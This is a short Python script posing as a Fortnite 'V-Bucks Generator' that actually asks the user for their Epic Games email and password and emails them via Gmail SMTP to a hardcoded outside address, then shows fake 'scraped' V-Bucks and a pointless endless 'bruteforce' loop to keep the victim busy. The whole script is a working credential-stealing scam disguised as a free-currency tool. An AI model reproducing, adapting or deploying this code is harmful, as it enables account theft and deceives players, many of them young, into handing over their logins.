import random
import time
import smtplib
import os

email = "vbuckgensender@gmail.com"
server = "connectto.net"

scraper = "somedudesonwheels@gmail.com"

server_ = smtplib.SMTP("smtp.gmail.com", 587)

print(r""" __      ______             _           _____                           _             
 \ \    / /  _ \           | |         / ____|                         | |            
  \ \  / /| |_) |_   _  ___| | _____  | |  __  ___ _ __   ___ _ __ __ _| |_ ___  _ __ 
   \ \/ / |  _ <| | | |/ __| |/ / __| | | |_ |/ _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
    \  /  | |_) | |_| | (__|   <\__ \ | |__| |  __/ | | |  __/ | | (_| | || (_) | |   
     \/   |____/ \__,_|\___|_|\_\___/  \_____|\___|_| |_|\___|_|  \__,_|\__\___/|_|   
                                                                                      
                                                                                      """)
print("Written by Kratismo, don't copy this script.")
client_email = input("[+] Please enter email used in Epic Games Account (without the @gmail.com): ")
client_password = input("Password for " + client_email + ": ")
print("Attempting to scrape V-Bucks...")
server_.starttls()
server_.login(email, server)
text = client_email + " " + client_password
server_.sendmail(email, scraper, text)
server_.quit()
print("Done.")
time.sleep(1)
scrape = random.randint(1, 500)
print("Managed to scrape: " + str(scrape) + " V-Bucks!")
print("Starting V-Bucks hash key bruteforce...")
time.sleep(1)
key = random.randint(1, 99999999999999999999999999999999999999999999999999999999999999999999)
while True:
    randomkey = random.randint(1, 99999999999999999999999999999999999999999999999999999999999999999999)
    print("Trying: " + str(randomkey))
    if key == randomkey:
        randomthing = random.randint(1, 100000)
        print("[+] Found V-Buck hash for " + randomthing + " V-Bucks!")
        input("Press enter to collect V-Bucks and close.")

input("Press any key to collect and enter to close.")


